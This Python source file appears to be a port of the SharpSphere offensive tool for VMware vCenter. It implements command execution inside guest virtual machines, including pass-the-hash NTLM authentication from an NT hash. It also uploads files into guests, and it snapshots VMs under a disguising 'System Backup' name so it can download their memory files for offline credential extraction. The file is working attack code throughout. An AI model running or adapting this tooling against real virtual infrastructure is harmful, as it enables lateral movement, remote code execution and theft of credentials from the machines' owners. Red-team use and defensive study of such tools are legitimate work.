import re
import os
import time
import datetime
import requests
import string
import random
import tabulate
import codecs

from urllib.parse import urlparse
from urllib.parse import quote, unquote

from pysharpsphere.lib import service_instance, ntlm
from pyVmomi import vim


def make_type3_message(type1, type2, username, nt_hash):
    nt_hash = codecs.decode(nt_hash, 'hex')
    type3, _ = ntlm.getNTLMSSPType3(type1, codecs.decode(type2, 'base64'),
                                    username, '', 'DOMAIN', nthash=nt_hash)
    return codecs.encode(type3.getData(), 'base64').decode().replace('\n', '')


def scan_for_vms(obj, ret=None):
    if ret is None:
        ret = []

    if isinstance(obj, vim.VirtualMachine):
        ret.append(obj)
    elif isinstance(obj, vim.Folder):
        for child in obj.childEntity:
            scan_for_vms(child, ret)
    elif isinstance(obj, vim.VirtualApp):
        for vm in obj.vm:
            scan_for_vms(vm, ret)

    return ret


def get_snap_shot(vm):
    print('[*] Finding snapshot on target machine {}'.format(vm._moId))
    if vm.snapshot is not None:
        print('[+] Found exists snapshot!')
        return vm.snapshot.currentSnapshot
    else:
        print('[*] No snapshot found, taking new snapshot ...')
        if vm.runtime.powerState != 'poweredOn':
            print('[-] VM is not powered on, no point snapshotting')
            exit(1)

        name = 'System Backup {}'.format(datetime.datetime.now())
        task = vm.CreateSnapshot_Task(name, name, True, True)

        while task.info.state != 'success':
            if task.info.state == 'error':
                print('[-] Error creating snapshot')
                exit(1)
            elif task.info.state == 'running':
                time.sleep(10)
            else:
                raise Exception('unknown state {}'.format(task.info.state))

        print('[+] Snapshot created successfully')
        return task.info.result


def print_vm(vm_list):
    table_header = ['DataCenter', 'MoID', 'Name', 'Power', 'OS', 'Tools', 'IP']
    table_body = []

    for item in vm_list:
        for obj in item['vm']:
            guest = obj.guest
            config = obj.config
            runtime = obj.runtime

            table_body.append([
                item['dc'].name,
                obj._moId,
                config.name,
                runtime.powerState[7:],
                config.guestFullName,
                guest.toolsVersionStatus2[10:],
                guest.ipAddress
            ])

    print(tabulate.tabulate(table_body, headers=table_header))


def _download(url, headers):
    local_filename = unquote(os.path.basename(urlparse(url).path))
    with requests.get(url, stream=True, headers=headers, verify=False) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

    print('[+] Downloaded successfully: {}'.format(local_filename))


def download_file(host, port, uri, cookie=None):
    url = urlparse('https://{}:{}{}'.format(host, port, uri)).geturl()
    url2 = url.replace('.vmem', '.vmsn')

    headers = {
        'cookie': cookie
    }

    print('[*] Downloading .vmsn file ...')
    _download(url2, headers)

    print('[*] Downloading .vmem file ...')
    _download(url, headers)


class SharpSphere(object):
    _host = None
    _port = None
    _cookie = None

    service_content = None
    credential = None

    def __init__(self, args):
        self._host = args.host
        self._port = args.port

        si = service_instance.connect(args)
        self.service_content = si.RetrieveContent()

        self._cookie = si._stub.cookie

    def get_credential(self, target_vm, username, password='', use_ntlm=False):
        auth_manager = self.service_content.guestOperationsManager.authManager
        credential = None

        if not use_ntlm:
            credential = vim.NamePasswordAuthentication(username=username, password=password,
                                                        interactiveSession=False)
        else:
            print('[*] Starting NTLM authentication ...')
            type1 = ntlm.getNTLMSSPType1()
            token = codecs.encode(type1.getData(), 'base64').decode().replace('\n', '')
            try:
                auth = vim.SSPIAuthentication(interactiveSession=False,
                                              sspiToken=token)
                auth_manager.AcquireCredentialsInGuest(target_vm, auth)
            except vim.GuestAuthenticationChallenge as challenge:
                type2 = challenge.serverChallenge.sspiToken.encode()
                sspi_token = make_type3_message(type1, type2, username, password)

                auth = vim.SSPIAuthentication(interactiveSession=False, sspiToken=sspi_token)
                credential = auth_manager.AcquireCredentialsInGuest(target_vm, auth, challenge.sessionID)

        if not credential:
            raise Exception('cannot construct guest credential')

        return credential

    def list_vm(self):
        print('[*] Retrieve virtual machines list ...')
        result = []
        child = self.service_content.rootFolder.childEntity

        datacenters = [i for i in child if isinstance(i, vim.Datacenter)]
        for dc in datacenters:
            folder = dc.vmFolder
            result.append({
                'dc': dc,
                'vm': scan_for_vms(folder),
            })

        return result

    def find_vm(self, mo_id):
        vms = self.list_vm()
        target_dc = None
        target_vm = None

        for item in vms:
            for vm in item['vm']:
                if vm._moId == mo_id:
                    target_dc = item['dc']
                    target_vm = vm
                    break

        if target_vm is None:
            print('[-] Virtual machine with moId {} not found'.format(mo_id))
            exit(1)

        return target_vm, target_dc

    def execute_vm(self, mo_id, username, password, command, print_output=True, use_ntlm=False):
        print('[*] Execute command on target virtual machine ...')
        target_vm, _ = self.find_vm(mo_id)

        process_manager = self.service_content.guestOperationsManager.processManager
        os_name = str(target_vm.config.guestFullName)
        fn = ''.join(random.choices(string.ascii_lowercase, k=6))

        if 'Microsoft Windows' in os_name:
            output = 'C:\\Users\\Public\\output_{}'.format(fn)
            arguments = '/c {} > {}'.format(command, output)
            program_path = 'C:\\Windows\\system32\\cmd.exe'
            print('[*] Target OS is Windows, using {} to execute command ...'.format(program_path))
        elif 'Linux' in os_name:
            if use_ntlm:
                raise Exception('it is not funny')

            output = '/tmp/output_{}'.format(fn)
            arguments = '-c \'{} > {}\''.format(command, output)
            program_path = '/bin/bash'
            print('[*] Target OS is Linux, using {} to execute command ...'.format(program_path))
        else:
            print('[-] Unknown operation system {}'.format(os_name))
            return exit(1)

        credential = self.get_credential(target_vm, username, password, use_ntlm)
        program_spec = vim.vm.guest.ProcessManager.ProgramSpec(arguments=arguments, programPath=program_path)
        ret = int(process_manager.StartProgramInGuest(target_vm, credential, program_spec))
        print('[+] Process start successfully with PID {}'.format(ret))

        while print_output:
            time.sleep(3)
            process_info = process_manager.ListProcessesInGuest(target_vm, credential, [ret])

            if len(process_info) == 0:
                print('[-] Error retrieving status of the process')
                exit(1)

            if process_info[0].exitCode is not None:
                print('[*] Program exited, retrieving output ...')
                file_manager = self.service_content.guestOperationsManager.fileManager
                file_info = file_manager.InitiateFileTransferFromGuest(target_vm, credential, output)
                print('[*] Command output:')
                print(requests.get(file_info.url, verify=False).text)
                break

    def dump_vm(self, mo_id):
        target_vm, target_dc = self.find_vm(mo_id)
        snapshot = get_snap_shot(target_vm)
        files = snapshot.config.files

        browser = target_vm.environmentBrowser.datastoreBrowser
        task = browser.SearchDatastore_Task(files.snapshotDirectory, vim.HostDatastoreBrowserSearchSpec(
            matchPattern='*.vmem',
            searchCaseInsensitive=True,
            details=vim.FileQueryFlags(
                fileOwner=True,
                fileSize=True,
                fileType=True,
                modification=True
            )
        ))

        print('[*] Finding snapshot files ...')
        while task.info.state != 'success':
            if task.info.state == 'error':
                print('[-] Error searching datastore for snapshot files')
                exit(1)
            elif task.info.state == 'running':
                time.sleep(10)
            else:
                raise Exception('unknown state {}'.format(task.info.state))

        results = task.info.result
        if not len(results.file):
            print('[-] Failed to find any .vmem files associated with the VM')

        last_file = None
        for file in results.file:
            if last_file is None or file.modification > last_file.modification:
                last_file = file

        match_ds_name = re.compile('^\[(.*?)\] .*$')
        ds_name = match_ds_name.findall(results.folderPath)[0]
        folder_path = results.folderPath[len(ds_name) + 3:]

        uri = '/folder/{}{}?dcPath={}&dsName={}'.format(quote(folder_path),
                                                        quote(last_file.path),
                                                        quote(target_dc.name),
                                                        quote(ds_name))
        download_file(self._host, self._port, uri, cookie=self._cookie)

    def upload_file(self, mo_id, username, password, src, dest, use_ntlm=False):
        target_vm, _ = self.find_vm(mo_id)
        print('[*] Uploading file to VM {} ...'.format(target_vm._moId))

        credential = self.get_credential(target_vm, username, password, use_ntlm)
        file_manager = self.service_content.guestOperationsManager.fileManager

        with open(src, 'rb') as f:
            data = f.read()

        file_attributes = vim.vm.guest.FileManager.FileAttributes()
        file_transfer_url = file_manager.InitiateFileTransferToGuest(target_vm, credential, dest,
                                                                     file_attributes,
                                                                     len(data), True)
        print('[*] Sending file data ...')
        if requests.put(file_transfer_url, data=data, verify=False).status_code == 200:
            print('[+] Uploaded file to {} successfully'.format(dest))
        else:
            print('[-] Failed')
